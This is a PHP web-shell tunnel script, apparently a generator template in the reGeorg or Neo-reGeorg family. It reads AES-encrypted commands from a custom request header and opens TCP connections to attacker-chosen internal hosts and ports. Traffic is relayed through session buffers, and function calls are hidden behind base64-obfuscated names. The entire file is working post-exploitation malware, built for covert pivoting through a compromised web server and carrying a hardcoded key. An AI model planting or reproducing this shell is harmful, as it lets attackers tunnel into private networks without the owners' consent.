<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
ini_set('always_populate_raw_post_data', -1);
error_reporting(E_ERROR | E_PARSE);
$authHeader = $_SERVER['HTTP_AUTHORZIONS']; //从请求头读取加密数据

function padZero($data, $blocksize = 16)
{
    $pad = $blocksize - (strlen($data) % $blocksize);
    return $data . str_repeat("\0", $pad);
}
$key = "qianxinnb";
$iv = 'ffffuuuucccckkkk';
if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);

function blv_decode($data) {
    $data_len = strlen($data);
    $info = array();
    $i = 0;
    while ( $i < $data_len) {
        $d = unpack("c1b/N1l", substr($data, $i, 5));
        $b = $d['b'];
        $l = $d['l'] - BLV_L_OFFSET;
        $i += 5;
        $v = substr($data, $i, $l);
        $i += $l;
        $info[$b] = $v;
    }
    return $info;
}

function blv_encode($info) {
    $data = "";
    $info[0] = randstr();
    $info[39] = randstr();

    foreach($info as $b => $v) {
        $l = strlen($v) + BLV_L_OFFSET;
        $data .= pack("c1N1", $b, $l);
        $data .= $v;
    }
    return $data;
}

function randstr() {
    $rand = '';
    $length = mt_rand(5, 20);
    for ($i = 0; $i < $length; $i++) {
        $rand .= chr(mt_rand(0, 255));
    }
    return $rand;
}

$shuju          = 1;
$Auth_key           = 2;
$MARK          = 3;
$STATUS        = 4;
$ERROR         = 5;
$TT            = 6;
$PP          = 7;
$REDIRECTURL   = 8;
$FORCEREDIRECT = 9;

$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "BASE64 CHARSLIST";
// $content = file_get_contents('php://input');
$post_data = openssl_decrypt(base64_decode(base64_decode($authHeader)), "AES-128-CBC", $key, OPENSSL_NO_PADDING, $iv);
if (USE_REQUEST_TEMPLATE == 1) {
    $post_data = substr($post_data, START_INDEX);
    $post_data = substr($post_data, 0, -END_INDEX);
}
$info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
$rinfo = array();

$mark = $info[$MARK];
$cmd = $info[$Auth_key];
$run = "run".$mark;
$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;
function my_session_start() {
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
}

function my_session_write_close() {
    session_write_close();
}

function my_fwrite($socket, $data) {
    return fwrite($socket, $data);
}

function my_fgets($socket, $length) {
    return fgets($socket, $length);
}
$run = 'ar'.base64_decode('cmF5');
$red = 're'.base64_decode('ZHVjZQ==');

$galaxy = implode('_', array($run,$red));
$cash = array(null);
switch($cmd){
    case "CONNECT":
        {
            set_time_limit(0);
            $target = $info[$TT];
            $port = (int) $info[$PP];
            $res = stream_socket_client("tcp://$target:$port", $errno, $errstr, 3);

            if ($res === false)
            {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'Failed connecting to target';
                break;
            }

            stream_set_blocking($res, false);
            // ();
            @$galaxy($cash, 'ignore_user_abort');
            @$galaxy($cash, 'my_session_start');
            // @my_session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            session_write_close();

            while ($_SESSION[$run])
            {
                if (empty($_SESSION[$writebuf])) {
                    usleep(50000);
                }

                $readBuff = "";
                @$galaxy($cash, 'my_session_start');
                $writeBuff = $_SESSION[$writebuf];
                $_SESSION[$writebuf] = "";
                @$galaxy($cash, 'my_session_write_close');

                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        // @session_start();
                        @$galaxy($cash, 'my_session_start');

                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, 513)) {
                    if($o === false)
                    {
                        // @session_start();
                        @$galaxy($cash, 'my_session_start');

                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                    $readBuff .= $o;
                    if ( strlen($readBuff) > 524288 ) {
                        break;
                    }
                }
                if ($readBuff != ""){
                    @$galaxy($cash, 'my_session_start');

                    // @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "DISCONNECT":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            session_write_close();
        }
        break;
    case "READ":
        {
            @session_start();
            $readBuffer = $_SESSION[$readbuf];
            $_SESSION[$readbuf]="";
            $running = $_SESSION[$run];
            session_write_close();
            if ($running) {
                $rinfo[$STATUS] = 'OK';
                $rinfo[$shuju] = $readBuffer;
                header("Connection: Keep-Alive");
            } else {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'TCP session is closed';
            }
        }
        break;
    case "FORWARD": {
            @session_start();
            $running = $_SESSION[$run];
            session_write_close();
            if(!$running){
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'TCP session is closed';
                break;
            }
            $rawPostData = $info[$shuju];
            if ($rawPostData) {
                @session_start();
                $_SESSION[$writebuf] .= $rawPostData;
                session_write_close();
                $rinfo[$STATUS] = 'OK';
                header("Connection: Keep-Alive");
            } else {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'POST data parse error';
            }
        }
        break;
    default: {
        $sayhello = true;
        @session_start();
        session_write_close();
    }
}
if ( $sayhello ) {
    echo base64_decode(strtr("Qianxin, 'Niubi'", $de, $en));
} else {
    $resp=strtr(base64_encode(blv_encode($rinfo)), $en, $de);
    $encode = base64_encode(openssl_encrypt(padZero($resp), "AES-128-CBC", $key, OPENSSL_NO_PADDING, $iv));
    header("Auth_Response: ".$encode);
}
